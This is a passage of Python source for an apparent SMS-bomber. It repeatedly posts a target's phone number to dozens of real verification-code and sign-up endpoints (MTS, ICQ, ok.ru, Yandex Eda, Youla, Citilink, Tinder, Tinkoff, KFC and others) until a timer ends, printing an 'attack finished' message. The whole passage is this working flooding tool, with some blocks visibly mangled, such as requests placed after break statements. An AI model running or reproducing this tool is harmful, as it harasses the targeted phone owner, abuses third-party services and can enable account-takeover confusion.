            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                          params={"msisdn": _phone})
            R = R + 1
            print('[+] MTS отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                          data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                                "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            R = R + 1
            print('[+] ICQ отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                          data={"st.r.phone": "+" + _phone})
            R = R + 1
            print('[+] OK отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
                          json={"phone_number": "+" + _phone})
            R = R + 1
            print('[+] Eda.Yandex отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
            R = R + 1
            print('[+] Youla отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            R = R + 1
            print('[+] Citilink отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
            R = R + 1
            print('[+] Sunlight отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                          params={"msisdn": _phone})
            R = R + 1
            print('[+] MTS отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                          data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                                "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            R = R + 1
            print('[+] ICQ отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                          data={"st.r.phone": "+" + _phone})
            R = R + 1
            print('[+] OK отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break

        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
            R = R + 1
            print('[+] MTS отправлено!|| Кол-во - ' + str(R))
        except:
            print('[-] Не отправлено!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
            R = R + 1
            print('[+] Youla отправлено!|| Кол-во - ' + str(R))
        except:
            print('[-] Не отправлено!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
            R = R + 1
            print('[+] Rutube отправлено!')
        except:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            print('[+] Citilink отправлено!|| Кол-во - ' + str(R))

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
            R = R + 1
            print('[+] Sunlight отправлено!|| Кол-во - ' + str(R))
        except:
            print('[-] Не отправлено!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            R = R + 1
            print('[+] Citilink отправлено!|| Кол-во - ' + str(R))
        except:
            print('[-] Не отправлено!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                          data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                                "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            R = R + 1
            print('[+] ICQ отправлено!|| Кол-во - ' + str(R))
        except:
            print('[-] Не отправлено!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                          data={"st.r.phone": "+" + _phone})
            R = R + 1
            print('[+] OK отправлено!|| Кол-во - ' + str(R))
        except:
            print('[-] Не отправлено!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break

        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
                          json={"phone_number": "+" + _phone})
            R = R + 1
            print('[+] Eda.Yandex отправлено!|| Кол-во - ' + str(R))
        except:
            print('[-] Не отправлено!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
            R = R + 1
            print('[+] Youla отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Не отправлено!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
                          json={"phone_number": "+" + _phone})
            R = R + 1
            print('[+] Eda.Yandex отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
            R = R + 1
            print('[+] Youla отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
            R = R + 1
            print('[+] MTS отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                          params={"msisdn": _phone})
            R = R + 1
            print('[+] MTS отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            R = R + 1
            print('[+] Citilink отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
            print('[-] не отправлено!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
            R = R + 1
            print('[+] Sunlight отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                          params={"msisdn": _phone})
            R = R + 1
            print('[+] MTS отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                          data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                                "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            R = R + 1
            print('[+] ICQ отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                          data={"st.r.phone": "+" + _phone})
            R = R + 1
            print('[+] OK отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
                          json={"phone_number": "+" + _phone})
            R = R + 1
            print('[+] Eda.Yandex отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
            R = R + 1
            print('[+] Youla отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                          params={"msisdn": _phone})
            R = R + 1
            print('[+] MTS отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                          data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                                "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            R = R + 1
            print('[+] ICQ отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                          data={"st.r.phone": "+" + _phone})
            R = R + 1
            print('[+] OK отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
            R = R + 1
            print('[+] MTS отправлено!|| Кол-во - ' + str(R))
        except:
            print('[-] Не отправлено!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
            R = R + 1
            print('[+] Youla отправлено!|| Кол-во - ' + str(R))
        except:
            print('[-] Не отправлено!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
            R = R + 1
            print('[+] Sunlight отправлено!|| Кол-во - ' + str(R))
        except:
            print('[-] Не отправлено!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            R = R + 1
            print('[+] Citilink отправлено!|| Кол-во - ' + str(R))
        except:
            print('[-] Не отправлено!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                          data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                                "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            R = R + 1
            print('[+] ICQ отправлено!|| Кол-во - ' + str(R))
        except:
            print('[-] Не отправлено!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                          data={"st.r.phone": "+" + _phone})
            R = R + 1
            print('[+] OK отправлено!|| Кол-во - ' + str(R))
        except:
            print('[-] Не отправлено!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
                          json={"phone_number": "+" + _phone})
            R = R + 1
            print('[+] Eda.Yandex отправлено!|| Кол-во - ' + str(R))
        except:
            print('[-] Не отправлено!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
            R = R + 1
            print('[+] Youla отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Не отправлено!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
            R = R + 1
            print('[+] Youla отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
            R = R + 1
            print('[+] MTS отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                          params={"msisdn": _phone})
            R = R + 1
            print('[+] MTS отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            R = R + 1
            print('[+] Citilink отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
            R = R + 1
            print('[+] Sunlight отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                          params={"msisdn": _phone})
            R = R + 1
            print('[+] MTS отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                          data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                                "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            R = R + 1
            print('[+] ICQ отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                          data={"st.r.phone": "+" + _phone})
            R = R + 1
            print('[+] OK отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
                          json={"phone_number": "+" + _phone})
            R = R + 1
            print('[+] Eda.Yandex отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
            R = R + 1
            print('[+] Youla отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            R = R + 1
            print('[+] Citilink отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
            R = R + 1
            print('[+] Sunlight отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                          params={"msisdn": _phone})
            R = R + 1
            print('[+] MTS отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                          data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                                "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            R = R + 1
            print('[+] ICQ отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
            R = R + 1
            print('[+] MTS отправлено!|| Кол-во - ' + str(R))
        except:
            print('[-] Не отправлено!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
            R = R + 1
            print('[+] Youla отправлено!|| Кол-во - ' + str(R))
        except:
            print('[-] Не отправлено!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
            R = R + 1
            print('[+] Sunlight отправлено!|| Кол-во - ' + str(R))
        except:
            print('[-] Не отправлено!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            R = R + 1
            print('[+] Citilink отправлено!|| Кол-во - ' + str(R))
        except:
            print('[-] Не отправлено!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                          data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                                "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            R = R + 1
            print('[+] ICQ отправлено!|| Кол-во - ' + str(R))
        except:
            print('[-] Не отправлено!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                          data={"st.r.phone": "+" + _phone})
            R = R + 1
            print('[+] OK отправлено!|| Кол-во - ' + str(R))
        except:
            print('[-] Не отправлено!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
                          json={"phone_number": "+" + _phone})
            R = R + 1
            print('[+] Eda.Yandex отправлено!|| Кол-во - ' + str(R))
        except:
            print('[-] Не отправлено!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
                          json={"phone_number": "+" + _phone})
            R = R + 1
            print('[+] Eda.Yandex отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
            R = R + 1
            print('[+] Youla отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")



def send_sms2(serv,_phone, start_time, CLOSE_AFTER, phone9, _phone9, _phonePizzahut, _name, name, _email, email, password, username):
    if serv == 0:
        requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
    elif serv == 1:
        requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
    elif serv == 2:
        requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
    elif serv == 3:
        requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone}, headers={})
    elif serv == 4:
        requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
    elif serv == 5:
        requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + _phone}, headers={})
    elif serv == 6:
        requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
    elif serv == 7:
        requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
    elif serv == 8:
        requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
    elif serv == 9:
        requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
    elif serv == 10:
        requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',data={'name': _name, 'phone': _phone, 'promo': 'yellowforma'})
    elif serv == 11:
        requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true', 'snLogin': '', 'bpg': '', 'snProviderId': ''},data={'phone': _phone, 'g-recaptcha-response': '', 'recaptcha': 'on'})
    elif serv == 12:
        requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone=' + _phone9 + '&country_code=%2B7&nod=4&locale=en')
    elif serv == 13:
        requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone, 'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
    elif serv == 14:
        requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
    elif serv == 15:
        requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
    elif serv == 16:
        requests.post('https://online.sbis.ru/reg/service/',json={'jsonrpc': '2.0', 'protocol': '5', 'method': 'Пользователь.ЗаявкаНаФизика','params': {'phone': _phone}, 'id': '1'})
    elif serv == 17:
        requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest',json={'firstName': 'Иван', 'middleName': 'Иванович', 'lastName': 'Иванов', 'sex': '1','birthDate': '10.10.2000', 'mobilePhone': _phone9, 'russianFederationResident': 'true','isDSA': 'false', 'personalDataProcessingAgreement': 'true', 'bKIRequestAgreement': 'null','promotionAgreement': 'true'})
    elif serv == 18:
        requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
    elif serv == 19:
        requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
    elif serv == 20:
        requests.post("https://api.carsmile.com/", json={"operationName": "enterPhone", "variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
    elif serv == 21:
        requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
    elif serv == 22:
        requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
    elif serv == 23:
        requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
    elif serv == 25:
        requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',"k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
    elif serv == 26:
        requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + _phone, "phone_permission": "unknown", "stream_id": 0,"v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
    elif serv == 29:
        requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+'})
    elif serv == 30:
        requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email"})
    elif serv == 31:
